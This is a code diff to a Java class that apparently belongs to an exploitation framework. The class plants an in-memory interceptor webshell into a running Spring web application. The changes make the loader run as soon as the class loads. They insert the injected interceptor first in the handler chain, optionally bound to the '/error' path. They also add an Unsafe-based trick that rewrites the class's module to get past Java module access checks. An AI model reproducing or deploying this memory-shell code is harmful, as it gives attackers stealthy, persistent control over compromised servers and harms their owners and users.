@@ -4,6 +4,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -20,10 +21,15 @@ import java.util.zip.GZIPInputStream;
 @Middleware(Middleware.Spring)
 @MemShell(MemShell.Interceptor)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.CLASSNAME})
+@JavaClassModifiable({JavaClassModifiable.CLASSNAME, JavaClassModifiable.PATH})
 public class SpringInterceptorContextLoader {
     private static String gzipObject;
     private static String CLASSNAME;
+    private static String PATH;
+
+    static {
+        new SpringInterceptorContextLoader();
+    }
 
     public SpringInterceptorContextLoader() {
         try {
@@ -34,6 +40,7 @@ public class SpringInterceptorContextLoader {
     }
 
     public static void inject() throws Exception {
+        addModule();
         Object requestAttributes = Class.forName("org.springframework.web.context.request.RequestContextHolder").getMethod("currentRequestAttributes").invoke(null);
         Object context = invokeMethod(Class.forName("org.springframework.web.context.request.RequestAttributes"), requestAttributes, "getAttribute", new Class[]{String.class, Integer.TYPE}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0});
         Object abstractHandlerMapping = invokeMethod(Class.forName("org.springframework.context.support.AbstractApplicationContext"), context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
@@ -49,18 +56,29 @@ public class SpringInterceptorContextLoader {
 
         Class handlerInterceptorClass = Class.forName("org.springframework.web.servlet.HandlerInterceptor");
         byte[] bytes = decompress(gzipObject);
+
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
-        defineClass.setAccessible(true);
         Class clazz;
         try {
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+            defineClass.setAccessible(true);
             clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
         } catch (Exception e) {
             clazz = classLoader.loadClass(CLASSNAME);
         }
+
         Object javaObject = clazz.newInstance();
         Object object = Proxy.newProxyInstance(handlerInterceptorClass.getClassLoader(), new Class[]{handlerInterceptorClass}, (InvocationHandler) javaObject);
-        adaptedInterceptors.add(object);
+        // 插入到第一个
+        // 载入调试 org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandlerExecutionChain
+        // 特定 path 比如 error
+        if (PATH != null) {
+            Class cls = Class.forName("org.springframework.web.servlet.handler.MappedInterceptor");
+            Object mappedInterceptor = cls.getConstructor(new Class[]{String[].class, String[].class, handlerInterceptorClass}).newInstance(new Object[]{new String[]{"/error"}, null, object});
+            adaptedInterceptors.add(0, mappedInterceptor);
+        } else {
+            adaptedInterceptors.add(0, object);
+        }
     }
 
     public static byte[] decompress(String gzipObject) throws Exception {
@@ -110,7 +128,6 @@ public class SpringInterceptorContextLoader {
         final Field field = getField(obj.getClass(), fieldName);
         return field.get(obj);
     }
-
     public static Field getField(final Class<?> clazz, final String fieldName) {
         Field field = null;
         try {
@@ -126,5 +143,24 @@ public class SpringInterceptorContextLoader {
     public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
         final Field field = getField(obj.getClass(), fieldName);
         field.set(obj, value);
+    }
+
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = SpringInterceptorContextLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Throwable e) {
+
+        }
     }
 }
